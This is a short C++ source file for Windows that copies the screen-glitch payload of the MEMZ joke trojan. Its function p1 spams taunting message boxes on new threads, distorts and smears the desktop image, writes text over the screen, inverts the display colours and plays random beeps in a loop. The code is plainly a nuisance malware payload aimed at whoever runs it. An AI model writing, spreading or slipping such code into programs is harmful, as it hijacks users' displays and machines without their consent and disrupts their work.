//This is actually C++!!
#include <windows.h>
#include <WinUser.h>
#include <iostream>
#include <wingdi.h>
#include <math.h>
#include <stdlib.h>
#include <thread>
#include <processthreadsapi.h>
#include <tlhelp32.h>
#include <utilapiset.h>

bool p1() { //memz final payload effect but random
    for (int i = 1; i < 50; i++) {
        //msgbox spam
        DWORD dwID = 0;
        MSGBOXPARAMS msg = { 0 };
        msg.cbSize = sizeof(MSGBOXPARAMS);
        msg.hwndOwner = NULL;
        msg.hInstance = GetModuleHandle(NULL);
        msg.lpszText = L"bet you regret that now huh";
        msg.lpszCaption = L"ez";
        msg.dwStyle = MB_YESNO | MB_ICONQUESTION;
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msg, 0, &dwID);


        HWND desktop = GetDesktopWindow();
        HDC desk = GetDC(NULL);
        RECT rect;
        GetWindowRect(desktop, &rect);
        int w = rect.right - rect.left;
        int h = rect.bottom - rect.top;
        StretchBlt(desk, rand() % 100, rand() % 100, w - rand() % 100, h - rand() % 100, desk, 0, 0, w, h, MERGECOPY);
        Sleep(300 - (4 * i));
        TextOutA(desk, 100, 100, "Hey look its ur screen down below", 34);
        StretchBlt(desk, 100, 200, 300, 500, desk, 0, 0, w, h, SRCPAINT);

        HRGN hRegion1;
        hRegion1 = CreateRectRgn(0, 0, w, h);
        InvertRgn(desk, hRegion1);

        Beep(rand() % 30000, rand() % 1000);

    }
}